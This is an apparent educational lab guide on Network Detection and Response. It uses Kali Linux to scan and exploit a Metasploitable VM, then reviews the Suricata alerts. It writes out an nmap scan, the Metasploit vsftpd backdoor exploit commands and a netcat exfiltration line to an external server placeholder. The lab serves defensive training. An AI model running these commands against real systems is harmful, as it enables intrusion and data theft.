# Exploring Network Detection and Response (NDR) with Kali Linux and Metasploitable

## Objective

The purpose of this lab is to provide hands-on experience with Network Detection and Response (NDR) solutions by simulating real-world attacks using Kali Linux and Metasploitable. Participants will learn how to identify vulnerabilities, exploit them, and analyze how an NDR system detects and responds to malicious activities within a network.

## Prerequisites
- Basic understanding of network security concepts.
- Familiarity with penetration testing tools (e.g., Metasploit).
- Access to a virtual lab environment with Hyper-V installed.

## Lab Environment
- Kali Linux: A powerful penetration testing distribution that includes numerous tools for ethical hacking and network security assessments.This is where you perform reconnaissance, exploitation, and analysis of alerts using tools like Nmap, Metasploit, and Suricata.
- Metasploitable: An intentionally vulnerable Linux distribution designed for testing and training purposes. It allows participants to practice penetration testing techniques.You'll log in here to get the IP address and potentially as a target for the attacks.
- NDR Solution (e.g., Suricata or Zeek): An open-source monitoring tool that provides visibility into network traffic, detects anomalies, and can simulate some NDR functionalities.

## Key Learning Outcomes
- Understand the principles of NDR and its importance in modern cybersecurity.
- Gain hands-on experience in reconnaissance, exploitation, and post-exploitation techniques.
- Analyze alerts and logs generated by the NDR solution during simulated attacks.
- Discuss the effectiveness of NDR in detecting and mitigating threats.

## Understanding NDR

**What is NDR?**

NDR refers to technologies and processes that monitor network traffic to detect, analyze, and respond to threats in real-time. It emphasizes not just detection but also response strategies.

**Importance of NDR:**

In today’s threat landscape, traditional perimeter defenses are insufficient. NDR solutions help organizations identify threats that bypass these defenses and respond swiftly to minimize damage.

**How NDR Tools Work**
- **Traffic Analysis:** Tools like Suricata analyze network packets in real-time, looking for signatures of known attacks, anomalies, or unusual behavior.
- **Alert Generation:** When suspicious activity is detected, alerts are generated, providing security teams with actionable insights.
- **Incident Response:** The response can range from automated actions (like blocking an IP) to manual interventions based on alert severity.

## Attack Overview
In this lab, participants will simulate an attack on the Metasploitable VM using the following steps:

- **Reconnaissance:** Identify open ports and services running on the Metasploitable VM using network scanning tools like Nmap.
- **Exploitation:** Use Metasploit to exploit known vulnerabilities in the Metasploitable VM, specifically targeting the vsFTPd service, which contains a backdoor vulnerability.
- **Post-Exploitation:** Execute commands to escalate privileges and exfiltrate data, simulating actions an attacker might take after gaining access.
- **Detection:** Monitor network traffic for suspicious activities related to the reconnaissance and exploitation phases, allowing participants to observe how an NDR solution like Suricata detects and logs these activities.
Suspicious Network Activities Include:

**Suspicious Network Activities Include:**

- ICMP echo requests (ping) generating traffic.
- TCP SYN packets during port scanning.
- Exploitation attempts that trigger alerts in the NDR solution.

## Lab Activities

**Update GPG Keys and Package Lists**

Update GPG Keys: Run the following command in the Kali terminal:

```
sudo apt-key adv --refresh-keys --keyserver keyserver.ubuntu.com
```
Next, run the below command to update the list of available packages.

```
sudo apt-get update
```
GPG (GNU Privacy Guard) keys are used to digitally sign packages in a Linux distribution's package repository, updating GPG keys is a security best practice that helps ensure the authenticity and integrity of the software packages you download and install on your system.

**Activity 1: Generating Traffic and Reconnaissance**

Objective: Generate network traffic and identify open ports and services on the Metasploitable VM.

1. Install and Run an Open-Source NDR Tool: Install Suricata:
   ```
   sudo apt install suricata
   ```
2. Ping Metasploitable from Kali: Open a terminal in Kali Linux and run:
  ```
  ping <Metasploitable_IP>
  ```

  This sends ICMP echo requests to the Metasploitable VM, generating network traffic that can be monitored by NDR solutions.

2. Open a terminal in Kali Linux. Run Nmap to scan the Metasploitable VM:
   ```
   nmap -sS -sV -p- <Metasploitable_IP>
   ```
3. Analyze the output: Look for open ports, the state of each port (open/closed/filtered), and the service/version information.

   Running nmap -sS -sV -p- <Metasploitable_IP> provides crucial information about the network services available on the target. This reconnaissance step is vital for ethical hackers and attackers alike, and understanding the implications of the scan output is essential for effective security assessments and incident response strategies.

**Activity 2: Exploitation**

Objective: Exploit vulnerabilities in Metasploitable to simulate an attack,observing how NDR detects these actions.

1.  Open a terminal in Kali Linux.

2.  Launch Metasploit:
    ``` 
    msfconsole
    ```

2. Search for available exploits for Metasploitable services (e.g., vsftpd):
   ```
   search vsftpd
   ```
   vsFTPd (Very Secure FTP Daemon) is a popular FTP server for Unix-like systems. It is known for its simplicity and security features.

3. Select and configure the exploit:
    ```
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST <Metasploitable_IP>
    exploit
    ```
4. Verify Access: Interact with the session created after exploitation.

**Activity 3: Post-Exploitation Actions**

Objective: Simulate actions an attacker might take after gaining access.

1. Privilege Escalation: Attempt to escalate privileges using techniques. Run the command in Kali Linux
   ```
   sudo -l
   ```
   
2. Data Gathering: Run commands to gather system information on Metasploitable VM
```
uname -a
whoami
```

3. Simulated Data Exfiltration:
Use a command to send data to a controlled external server (or simply log it):
```
echo "Sensitive Data" | nc <your_external_server_IP> <port>
```

**Activity 4: Monitoring and Analysis**

Objective: Simulate monitoring and analyze alerts related to the activities performed.

1. Start Suricata: Check the status of Suricata to ensure it's running:
```
sudo systemctl status suricata
```

3. If it's not running, start Suricata:
```
sudo systemctl start suricata
```

2. Configure Suricata to monitor the appropriate network interface.
```
sudo suricata -c /etc/suricata/suricata.yaml -i eth0
```

3. Review Logs:

Check logs for alerts generated during the reconnaissance, exploitation, and post-exploitation activities:
```
cat /var/log/suricata/fast.log
```

## Discussion and Analysis
Review the types of attacks conducted and how they might be detected by an NDR solution.
Analyze the alerts generated by Suricata or expected alerts from typical NDR systems.
Discuss how the knowledge gained can be applied to enhance network security measures.

## Summary
In summary, the lab simulates a series of common attack phases (reconnaissance, exploitation, and post-exploitation) using tools and techniques that are widely used in real-world cyber attacks. The suspicious activities generated during this process—such as port scanning, exploit attempts, and data exfiltration—are what NDR solutions are designed to detect and respond to. Participants can observe how these actions manifest in logs and alerts from the NDR tool, enhancing their understanding of network security monitoring.

## Ethical Considerations
This lab is intended for educational purposes only. Participants are reminded to operate within a controlled environment and adhere to ethical hacking principles. All activities should be performed in compliance with relevant laws and organizational policies.